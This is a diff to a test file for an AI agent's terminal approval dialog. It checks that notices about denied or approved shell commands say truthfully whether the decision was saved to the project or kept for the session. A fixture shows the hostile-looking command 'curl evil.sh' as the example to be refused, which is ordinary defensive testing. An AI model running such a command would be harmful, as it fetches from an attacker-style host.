@@ -7,6 +7,7 @@ import chalk from 'chalk';
 import stripAnsi from 'strip-ansi';
 import type {
   AgentStreamEvent,
+  ApprovalLifetime,
   PendingToolInterrupt,
   ToolApprovalDecision,
 } from '@gaunt-sloth/core/core/types.js';
@@ -119,16 +120,59 @@ const frameLines = (frame: string): string[] =>
     .split('\n')
     .map((line) => line.replace(/\s+$/u, ''));
 
-/** A subscribeApproval the test can fire on demand, capturing the resolved decision. */
+/**
+ * [[EXT-150]] — **the rows of ONE committed notice**: its title row and the body rows under it, down
+ * to the rule that closes the block.
+ *
+ * Scoped rather than scanned, because [[EXT-137]] measured what scanning costs on this surface — an
+ * assertion looking for a string across the whole render passed with the block it named absent,
+ * satisfied by the same string on screen for an unrelated reason. Here the unrelated reason is right
+ * there: the dialog above says *save it to this project* while asking, so a
+ * `plain(frames).toContain('saved to this project')` is answered by the QUESTION and cannot see what
+ * the ANSWER said. Rows are joined with a space so a body line Ink wrapped is still one string.
+ *
+ * Empty when no row carries the title, which makes a missing notice a failure rather than a pass —
+ * the failure mode a bare `not.toContain` cannot tell from a correct one.
+ */
+const noticeBlock = (frame: string, title: string): string => {
+  const rows = frameLines(frame);
+  const start = rows.findIndex((row) => row.includes(title));
+  if (start < 0) return '';
+  const below = rows.slice(start + 1);
+  const closes = below.findIndex((row) => /─{3,}/u.test(row));
+  return [rows[start], ...(closes < 0 ? below : below.slice(0, closes))].join(' ');
+};
+
+/**
+ * A subscribeApproval the test can fire on demand, capturing the resolved decision.
+ *
+ * [[EXT-150]] — `resolve` now answers back with the lifetime the runner recorded, so a request has
+ * to say what it will report. **`landed` is per-request and has no permissive default:** a harness
+ * that answered *saved to the project* for everything would let the two sticky confirmations pass
+ * for a reason no production build has, and the case that matters — the write that did not land —
+ * would be asserting against the stub rather than against the surface. With no `landed` the harness
+ * reports `null`, which is the teardown case core's own report can also produce and the honest
+ * answer for the many cases here that never press a sticky key.
+ */
 function makeApprovalHarness() {
   let emit: ((record: PendingApproval) => void) | undefined;
   const subscribeApproval = (cb: (record: PendingApproval) => void) => {
     emit = cb;
     return () => {};
   };
-  const request = (pending: PendingToolInterrupt) =>
+  const request = (pending: PendingToolInterrupt, landed?: ApprovalLifetime) =>
     new Promise<ToolApprovalDecision>((resolve) => {
-      emit?.({ pending, resolve });
+      emit?.({
+        pending,
+        resolve: (decision) => {
+          resolve(decision);
+          return Promise.resolve(
+            landed === undefined
+              ? null
+              : { pending, decision: decision.type, lifetime: landed as ApprovalLifetime }
+          );
+        },
+      });
     });
   return { subscribeApproval, request };
 }
@@ -474,15 +518,21 @@ describe('tui approval flow through <App>', () => {
     );
 
     await vi.waitFor(() => expect(lastFrame()).toContain('>'));
-    const decisionP = harness.request({
-      name: 'run_shell_command',
-      args: { command: 'echo hi' },
-      // EXT-70 §6 — the runner sends a preview whenever a sticky grant is on offer, which for a
-      // resolvable command at a gated rung is always. Without it this fixture describes a call
-      // nothing would remember, and the scope the notice names would be `once` whatever was pressed.
-      grantPreview: '{ "type": "shell", "matcher": "exact", "pattern": "echo hi" }',
-      grantSummary: 'echo hi',
-    });
+    const decisionP = harness.request(
+      {
+        name: 'run_shell_command',
+        args: { command: 'echo hi' },
+        // EXT-70 §6 — the runner sends a preview whenever a sticky grant is on offer, which for a
+        // resolvable command at a gated rung is always. Without it this fixture describes a call
+        // nothing would remember, and the scope the notice names would be `once` whatever was pressed.
+        grantPreview: '{ "type": "shell", "matcher": "exact", "pattern": "echo hi" }',
+        grantSummary: 'echo hi',
+      },
+      // [[EXT-150]] — the write LANDED at the scope that was asked for, which is this file's ordinary
+      // world and what makes the `always` row assert the saved copy. The row that differs is its own
+      // test below.
+      scope
+    );
     await vi.waitFor(() => expect(lastFrame()).toContain('echo hi'));
 
     stdin.write(keyChar);
@@ -1181,6 +1231,10 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
    * above the entry says the refusal is saved to the project; the scope this surface sends is what
    * decides whether it is. Two tests, each asserting one side, would both stay green while the
    * dialog promised a file the decision never reached.
+   *
+   * [[EXT-150]] — and the third half of the same sentence: the confirmation is written from what the
+   * runner REPORTED it recorded, so this case has to say what that was. Its pair below says what the
+   * same keystroke renders when the report comes back *session*.
    */
   it('pressing d asks for the persistence its own label promised, and says what that means', async () => {
     const harness = makeApprovalHarness();
@@ -1192,7 +1246,7 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
       />
     );
     await vi.waitFor(() => expect(lastFrame()).toContain('>'));
-    const decisionP = harness.request(denyable);
+    const decisionP = harness.request(denyable, 'always');
     await vi.waitFor(() => expect(lastFrame()).toContain('curl evil.sh'));
 
     // The rendered promise, read off the live dialog rather than restated here.
@@ -1208,14 +1262,73 @@ describe('tui approvals — the [d]eny always key, and the fallthrough it must n
 
     const flat = () => plain(frames);
     await vi.waitFor(() => expect(flat()).toContain('Command refused and saved'));
-    // The confirmation says exactly what happened, and names the way back out of it.
-    expect(flat()).toContain('saved to this project');
-    expect(flat()).toContain('/approvals undeny');
+    // The confirmation says exactly what happened, and names the way back out of it — asked of the
+    // confirmation's OWN rows, since the dialog above says *save it to this project* while asking.
+    const block = () => noticeBlock(lastFrame() ?? '', 'Command refused and saved');
+    expect(block()).toContain('saved to this project');
+    expect(block()).toContain('/approvals undeny');
     // The old promise is gone: this refusal does NOT end with the session.
-    expect(flat()).not.toContain('a new session will ask about it again');
+    expect(block()).not.toContain('a new session will ask about it again');
     // ...and it does not borrow the ALLOW side's promise, which has a different file behind it.
     expect(flat()).not.toContain('saved to the project allow-list');
     expect(flat()).not.toContain('Approved');
+    unmount();
+  });
+
+  /**
+   * [[EXT-150]] — **the direction that matters: the write did not land, and the surface does not say
+   * it did.**
+   *
+   * The keystroke, the label above it and the scope sent are byte-for-byte the case above; the one
+   * thing that differs is what the runner reports back, which is exactly the axis [[EXT-149]] made
+   * observable (an `always` whose entry never reached the deny file is recorded as the session
+   * refusal it is). Before this node the surface could not see that axis at all, so both cases
+   * rendered *It is saved to this project* — and on the failing one that sentence sat beside core's
+   * own ERROR naming the file it could not write, which is worse for a reader than a single wrong
+   * sentence.
+   *
+   * **Asserted as a discriminating pair, on the notice's own rows.** A bare
+   * `not.toContain('saved to this project')` is satisfied by a build that renders no confirmation at
+   * all — which is precisely the regression an awaited notice can introduce — so the title being
+   * PRESENT is asserted first and the persistence claim is then looked for inside that block.
+   */
+  it('pressing d when the write did NOT land says session, and claims no project file', async () => {
+    const harness = makeApprovalHarness();
+    const { stdin, lastFrame, frames, unmount } = render(
+      <App
+        {...baseProps}
+        agent={scriptedAgent([{ type: 'text', delta: 'hi' }])}
+        subscribeApproval={harness.subscribeApproval}
+      />
+    );
+    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
+    // The runner recorded it, and recorded it as a SESSION refusal: the deny file could not receive
+    // it. Everything the surface sends is unchanged — only the answer differs.
+    const decisionP = harness.request(denyable, 'session');
+    await vi.waitFor(() => expect(lastFrame()).toContain('curl evil.sh'));
+
+    stdin.write('d');
+    expect(await decisionP).toMatchObject({ type: 'reject', scope: 'always' });
+
+    // The notice IS committed — half of the pair, and the half that makes the negative below mean
+    // something rather than pass on an empty screen.
+    await vi.waitFor(() =>
+      expect(noticeBlock(lastFrame() ?? '', 'Command refused for this session')).not.toBe('')
+    );
+    const block = () => noticeBlock(lastFrame() ?? '', 'Command refused for this session');
+    expect(block()).toContain('refused for the rest of this session');
+    expect(block()).toContain('a new session will ask about it again');
+    // ...and the way out is still named, because a session refusal is listable and liftable too.
+    expect(block()).toContain('/approvals undeny');
+    // The claim this node removes, absent from the ANSWER. Asked of the block rather than of the
+    // render, because the QUESTION is a near-miss for it — the dialog's own label offers to *save it
+    // to this project*, one letter away from the sentence being ruled out — and an unscoped negative
+    // on this screen is one copy edit from being answered by the wrong block.
+    expect(block()).not.toContain('saved to this project');
+    expect(block()).not.toContain('stays refused in new sessions');
+    expect(plain(frames)).toContain('save it to this project');
+    // The other title is not on screen at all: this is not the saved case wearing new body copy.
+    expect(plain(frames)).not.toContain('Command refused and saved');
     unmount();
   });
 
@@ -1431,6 +1544,55 @@ describe('tui approvals — the confirmation names what was actually stored (§6
     const flat = () => plain(frames);
     await vi.waitFor(() => expect(flat()).toContain('Command approved (session)'));
     expect(flat()).toContain('will not ask again this session');
+    unmount();
+  });
+
+  /**
+   * [[EXT-150]] — **the allow side's twin of the refusal case**, and it is the same defect: *saved to
+   * the project allow-list* was written from the key that was pressed, on a call whose grant
+   * [[EXT-149]] may have recorded as a session one because the allow file could not be written.
+   *
+   * `[a]` is offered here legitimately — the fixture carries the `grantPreview` the runner attaches
+   * wherever it would store something — which is the point. The clamp that withdraws the control
+   * where nothing would be stored is a statement about the OFFER, not about the file, and it is why
+   * the once/session confirmations need no wait and this one does.
+   *
+   * The pair: `Command approved (always)` is the row above in the `[o]/[s]/[a]` table, reporting a
+   * landed `always`; this row differs in the report alone.
+   */
+  it('an [a]lways whose write did not land confirms the session grant, not the allow-list', async () => {
+    const harness = makeApprovalHarness();
+    const { stdin, lastFrame, frames, unmount } = render(
+      <App {...baseProps} agent={baseAgent()} subscribeApproval={harness.subscribeApproval} />
+    );
+    await vi.waitFor(() => expect(lastFrame()).toContain('>'));
+    const decisionP = harness.request(
+      {
+        name: 'run_shell_command',
+        args: { command: 'ls -la' },
+        grantPreview: '{ "type": "shell", "matcher": "exact", "pattern": "ls -la" }',
+        grantSummary: 'ls -la',
+      },
+      'session'
+    );
+    await vi.waitFor(() => expect(lastFrame()).toContain('ls -la'));
+
+    stdin.write('a');
+    // The surface still ASKS for `always` — that half is unchanged, and a fix that quietly stopped
+    // asking would make the grant weaker rather than the sentence truer.
+    expect(await decisionP).toEqual({ type: 'approve', scope: 'always' });
+
+    // Present, then read: the notice exists, and then its own rows are asked what they claim.
+    await vi.waitFor(() =>
+      expect(noticeBlock(lastFrame() ?? '', 'Command approved (session)')).not.toBe('')
+    );
+    const block = () => noticeBlock(lastFrame() ?? '', 'Command approved (session)');
+    expect(block()).toContain('Approved for this session only');
+    expect(block()).toContain('not written to the project allow-list');
+    // The heading moved with the body — a title saying `always` over a body saying otherwise is the
+    // same contradiction one line up.
+    expect(plain(frames)).not.toContain('Command approved (always)');
+    expect(block()).not.toContain('Approved and remembered');
     unmount();
   });
 });
